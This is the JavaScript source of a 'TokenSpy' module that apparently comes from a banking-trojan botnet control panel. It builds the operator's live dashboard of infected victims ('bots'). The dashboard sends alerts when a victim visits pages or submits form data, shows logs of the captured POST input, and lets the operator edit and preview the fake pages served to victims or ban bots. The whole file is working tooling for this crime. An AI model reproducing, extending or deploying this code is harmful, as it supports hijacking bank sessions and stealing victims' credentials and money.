define(['jquery', 'angular', 'underscore', 'socket.io', 'bootstrap', 'angular-extensions', 'colorbox', 'jquery.contextMenu'], function($, angular, _, io){
    'use strict';

    var initialize = function(){
    //...



//region Angular

var app = angular.module('TokenSpy', ['Extensions']);


//region Services

/** NodeJS connection service
 */
app.service('nodejs', ['$window', function($window){
    this.ok = false;

    var sio = this.socket = io_connect('/TokenSpy');
    this.ok = true;

    sio.on('connect', function(){
        // Subscribe the socket to the rooms i'd like to have
        sio.emit('subscribe', {room: 'gate'});
    });

    sio.on('test', function(msg){
        window.console && console.log('NodeJS message: "test", ', msg);
    });

    /** Bind NodeJS events to a $scope
     * @param {Scope} $scope
     * @param {Array.<String>} events
     */
    this.scopeEventProxy = function($scope, events){
        _(events).each(function(name){
            sio.on(name, function(msg){
                $scope.$emit(name, msg);
            });
        });
    };
}]);

/** Notifications service: webkitNotifications + sound notifications + presets
 */
app.service('notifications', ['$window', '$document', function($window, $document){
    // Check whether the notifications are available at all!
    // As Chrome only allows to ask the permission in a click() handler, we display something
    var modalTpl = _.template(
        '<div class="modal fade">' +
            '<div class="modal-body"><%= text %></div>' +
            '<div class="modal-footer"><a href="#" class="btn btn-primary"><%= btn %></a></div>' +
        '</div>'
    );
    if ($window.webkitNotifications && $window.webkitNotifications.checkPermission() != 0){
        $(
            modalTpl({
                text: 'TokenSpy works better with Desktop Notifications turned on!',
                btn: 'Enable Desktop Notifications'
            })
        ).find('.btn').click(function(){
                $window.webkitNotifications.requestPermission();
                $(this).closest('.modal').modal('hide');
                return false;
            }).end()
        .modal();
    }

    // Account all notifications so they can be closed with a single click
    var active_notifs = [];
    var closeAll = function(){
        _(active_notifs).each(function(n){
            n.cancel();
        });
        active_notifs = [];
    };

    /** Chrome notification wrapper
     * @param {String} image
     * @param {String} title
     * @param {String} message
     * @param {Number?} timeout
     *      Optional timeout for the notification
     */
    this.desktopNotification = function(image, title, message, timeout){
        if ($window.webkitNotifications && $window.webkitNotifications.checkPermission() == 0){
            var n = $window.webkitNotifications
                .createNotification(image, title, message);

            // Close-all-at-once
            n.onclose = closeAll;
            active_notifs.push(n);

            // Timeout support
            if (timeout)
                setTimeout(function(){
                    n.onclose = null; // prevent others from closing because of this one
                    n.cancel();
                    // Also remove it from the pile
                    active_notifs = _.without(active_notifs, n);
                }, timeout);

            // Finish
            n.show();
            return n;
        }
    };

    /** Prepare an <audio> tag for the sound you provide.
     * Use .play() method on it to play
     * @param {String} type
     *      MIME type
     * @param {String} file
     *      Sound file
     * @return {Node}
     */
    this.prepareSound = function(type, file){
        return {
            audio: $(
                '<audio>' +
                    '<source src="' + file + '" type="' + type + '" />' +
                    '<embed hidden="true" autostart="false" loop="false" src="' + file +'" />' +
                    '</audio>'
            ).get(0),

            play: function(){ this.audio.play(); }
        };
    };

    // Notification presets
    var notifications = {
        test: {
            sound: this.prepareSound('audio/ogg', 'theme/resources/TokenSpy/notifications/sound/test.ogg'),
            desktop: [
                null, // image
                _.template('TokenSpy'), // title
                _.template('One Ring to rule them all, One Ring to find them,\r\nOne Ring to bring them all and in the darkness bind them'), // message
                5000 // timeout
            ]
        },
        rule: {
            sound: this.prepareSound('audio/ogg', 'theme/resources/TokenSpy/notifications/sound/rule.ogg'),
            desktop: [
                null, // image
                _.template('New Bot'), // title
                _.template('BotID: <%= botId %>'), // message
                3000 // timeout
            ]
        },
        page: {
            sound: this.prepareSound('audio/ogg', 'theme/resources/TokenSpy/notifications/sound/page.ogg'),
            desktop: [
                null, // image
                _.template('Page switch'), // title
                _.template('<%= botId %> has moved to another page: <%= page.title %>'), // message
                3000 // timeout
            ]
        },
        visit: {
            sound: this.prepareSound('audio/ogg', 'theme/resources/TokenSpy/notifications/sound/visit.ogg'),
            desktop: null
        },
        post: {
            sound: this.prepareSound('audio/ogg', 'theme/resources/TokenSpy/notifications/sound/post.ogg'),
            desktop: [
                null, // image
                _.template('POST data'), // title
                _.template('<%= botId %> input'), // message
                3000 // timeout
            ]
        }
    };

    var recent_notifications = {}; // botid: timestamp
    setInterval(function(){
        // Cleanup
        var now = new Date();
        recent_notifications = _.filter(recent_notifications, function(v){
            return (now - v) > 60*1000;
        });
    }, 10000);

    /** Issue a notification using a preset
     * @param {String} event
     *      Notification preset name
     * @param {Object} data
     *      Object with the data for templates
     */
    this.notify = function(event, data){
        var nsets = notifications[event];
        if (!nsets)
            throw 'Notification preset not found: "'+event+'"';

        // Don't notify 'visit' when any other notification was recently activated
        if (data.botId !== undefined){
            var now = new Date();
            if (['visit', 'page'].indexOf(event) && recent_notifications[data.botId] && (now - recent_notifications[data.botId])<1000)
                return;
            recent_notifications[data.botId] = now;
        }

        // Sound
        if (nsets.sound)
            nsets.sound.play();

        // DesktopNotification
        if (nsets.desktop)
            this.desktopNotification(
                nsets.desktop[0], // image
                nsets.desktop[1](data), // title
                nsets.desktop[2](data), // message
                nsets.desktop[3] // timeout
            );
    };
}]);
//endregion



//region Controllers

/** TokenSpy state controller
 */
app.controller('TsStateCtrl', ['$scope', '$http', function($scope, $http){
    $scope.state = {
        enabled: false,
        paused: false
    };

    $scope.loading = false;

    // Load the state
    var AjaxTsState = function(action){
        $scope.loading = true;
        $http.get('?m=botnet_tokenspy/ajaxTsState' + (action? '&do=' + action : ''))
            .success(function(data) {
                $scope.loading = false;
                $scope.state = data;
                //$scope.$apply(); // Use me when replacing with jQuery
            });
    };
    AjaxTsState(null); // initialize

    // Helper methods
    $scope.btCls = function(name){
        var s = $scope.state;
        return {
                   on:       s.enabled && !s.paused,
                   pause:    s.enabled &&  s.paused,
                   off:     !s.enabled
               }[name]
            ? 'active' + ' ' + {
                on: 'btn-success',
                off: 'btn-danger',
                pause: 'btn-info'
        }[name]
            : '';
    };
    $scope.btClick = function(action){
        AjaxTsState(action);
        return false;
    };

    // Disable TS on window close
    $(window).bind("beforeunload", function(){
        // Request the TS to stop, synchronously
        $.ajax({ type: 'GET', async: false, url: '?m=botnet_tokenspy/ajaxTsState&do=off'});
    });
}]);

/** TokenSpy service controller
 */
app.controller('TsServiceCtrl', ['$scope', function($scope){
    var infowin;

    $scope.openInfowin = function(){
        infowin = window.open('?m=botnet_tokenspy/tsInfoWindow', 'infowin', 'width=600,height=800');
        infowin.onbeforeunload = function(){ infowin = undefined; };
    };

    $scope.infowinTrigger = function(event, data){
        if (infowin){
            infowin.$(infowin).trigger(event, data);
        }
    };
}]);



/** BotsState controller
 */
app.controller('BotsStateCtrl', ['$scope', 'nodejs', 'notifications', function($scope, nodejs, notifications){
    $scope.botsSort = [
        function(bot){
            return { on: 0, skip: 1, ign: 2 }[bot.istate];
        },
        '-atime'
    ];
    $scope.bots = {};

    // Helper
    $scope.filterBotLogEmpty = function(l){
        // last 2 items of bots[*].log are always: current, next
        // as they're not always set, they can be null, and we should filter them off
        return l !== null;
    };

    /** Walk recursively, following the given paths, and apply f() to the leaf elements.
     * Example usage: walk through a JSON object and construct Date objects
     * @param {*} root
     *      The root to recurse into
     * @param {Array.<String>} paths
     *      An array of paths to follow.
     * @param {function(val)} f
     *      The callback to apply to leaf items
     * @return {*} The leaf(s)
     */
    var objectAlterPaths = function(root, paths, f){
        _(paths).each(function(path){
            path = path.split('/');

            var pool = [root];

            // Sink
            var p;
            while (path.length >= 2){
                p = path.shift();
                var newpool = [];
                if (p == '*'){
                    // Iterate, replace the pool with children
                    _.each(pool, function(m){
                        _.each(m, function(v){
                            newpool.push(v);
                        });
                    });
                } else {
                    // Pluck
                    _.each(pool, function(m){
                        try { newpool.push(m[p]); } catch(e){} // scalar protection
                    });
                }
                pool = newpool;
            }

            // Replace
            p = path.shift(); // the final element
            if (p == '*'){
                // Wa can't just replace the array as that would have been another object
                // To do it in a non-destructive way, we iterate & assign elements
                _.each(pool, function(m){
                    for (var i in m)
                        if (m.hasOwnProperty(i))
                            m[i] = f(m[i]);
                });
            } else {
                // Save as property
                _.each(pool, function(m){
                    if (m !== undefined)
                        try { m[p] = f(m[p]); }catch(e){} // scalar protection
                });
            }
            return pool;
        });
    };

    /** Load the state & update $scope
     * @param {String?} botId
     *      Optional botId to load.
     *      `null` will load all bots
     */
    var loadAjaxBotsState = function(botId){
        botId = botId || null;

        $.get('?m=botnet_tokenspy/AjaxBotsState', {botId: botId?botId:''}, function(data){
            // Walk through the data and and construct `Date`s
            objectAlterPaths(data, [
                '*/ctime',
                '*/mtime',
                '*/atime',
                '*/post/ctime',
                '*/log/*/ctime'
            ], function(v){ return new Date(v); });

            // Update or Replace
            if (botId)
                $scope.bots = angular.extend($scope.bots, data);
            else
                $scope.bots = data;

            $scope.$apply();
        });
    };

    // NodeJS Integration
    nodejs.scopeEventProxy($scope, [
        'test',
        'rule',
        'page',
        'visit',
        'post'
    ]);

    $scope.$on('test', function(e, msg){
        notifications.notify('test', msg);
    });

    $scope.$on('rule', function(e, msg){
        notifications.notify('rule', msg);

        // reload the bot
        loadAjaxBotsState(msg.botId);
    });

    $scope.$on('page', function(e, msg){
        notifications.notify('page', msg);
        loadAjaxBotsState(msg.botId);

        $scope.$apply();
    });

    $scope.$on('visit', function(e, msg){
        notifications.notify('visit', msg);

        // fast update
        var bot = $scope.bots[msg.botId];
        if (!bot) return; // in case a long-running AJAX hasn't loaded the bot yet

        bot.atime = new Date();
        bot.hits ++;
        bot.url = msg.url;

        $scope.$apply();
    });

    $scope.$on('post', function(e, msg){
        notifications.notify('post', msg);

        // fast update
        var bot = $scope.bots[msg.botId];
        if (!bot) return; // in case a long-running AJAX hasn't loaded the bot yet

        var prev_count = bot.post? bot.post.post_count : 0;

        bot.atime = new Date();
        bot.url = msg.url;
        bot.hits++;
        bot.post = msg.post;
        bot.post.ctime = new Date(bot.post.ctime); // construct Date
        bot.post.post_count = 1*prev_count + 1;

        $scope.$apply();
    });

    // Startup
    loadAjaxBotsState();

    // Context menu
    $scope.cMenu = {
        bot: {
            selector: 'tr *',
            build: function($this, e){
                var bot = $this.scope().bot;

                var istate_item = {
                    disabled: function(key,opt){
                        return ('istate_' + bot.istate) == key;
                    },
                    callback: function(key,opt){
                        var istate = /^istate_(.+)$/.exec(key)[1];
                        $.get('?m=botnet_tokenspy/ajaxSetBotIstate.json', {botId: bot.botId, istate: istate})
                            .success(function(){
                                bot.istate = istate;
                                $scope.$apply();
                            });
                    }
                };

                return {
                    items: {
                        istate_on: _.defaults({ icon: 'istate-on', name: 'Turn On' }, istate_item),
                        istate_skip: _.defaults({ icon: 'istate-skip', name: 'Dismiss'}, istate_item),
                        istate_ign: _.defaults({ icon: 'istate-ign', name: 'Ban'}, istate_item)
                    }
                };
            }
        }
    };

    // Hints
    $('#ts-hints > *').each(function(){
        var $this = $(this);

        $(document).on('mouseenter', $this.data('hint-for'), function(){
            $this.show();
        }).on('mouseleave', $this.data('hint-for'), function(){
            $this.hide();
        });
    }).hide();

    //region Event handlers

    // #one-ring: Test notification
    $('#one-ring').on('click', function(){
        nodejs.socket.emit('test');
        return false;
    });

    // Bot page preview
    $scope.botActions = {
        botidClick: function(bot){
            $('#service-panel').scope().infowinTrigger('bot', bot.botId);
        },
        previewPage: function(bot){
            var post = {
                template: bot.template,
                    page: bot.page
            };
            $.post('?m=botnet_tokenspy/AjaxPagePreview', post, function(html){
                var win=window.open('about:blank', 'popup', 'width=800,height=600');

                win.document.open();
                win.document.write(html);
                win.document.close();
            });
        }
    };

    // Display bot POST log
    $('#ts-bots').on('click', 'td.post a', function(e){
        var botId = $(this).closest('tr').data('botid');
        $.colorbox({
            href: '?m=botnet_tokenspy/ajaxBotPosted',
            data: {botId: botId},
            open: true
        });
        return false;
    });

    // Log item tooltip
    $('#ts-bots').tooltip({
        selector: 'td.log ul li'
    });

    // Page Editor
    $('#ts-bots').on('click', 'td.log ul li a', function(e){
        var $this = $(this);
        var $li = $(this).closest('li');
        var $tr = $this.closest('tr');

        var id = $tr.data('id');
        var botId = $tr.data('botid');
        var className = 'BotState';
        var prop = $li.hasClass('page-curr')? 'page' : 'page2';

        var href = '?m=botnet_tokenspy/ajaxEditPage&class='+ className +'&prop=' + prop + '&id=' + id;
        if (e.shiftKey)
            href += '&hotPresets=1';

        $.colorbox({
            href: href,
            open: true,
            iframe: true,
            width: '90%',
            height: '90%',
            onClosed: function(){ // Update the line
                loadAjaxBotsState(botId);
            }
        });
        return false;
    });

    //endregion
}]);

//endregion

//endregion



    return app;
    // ...
    };
    // Return the App object
    return { initialize: initialize }
});
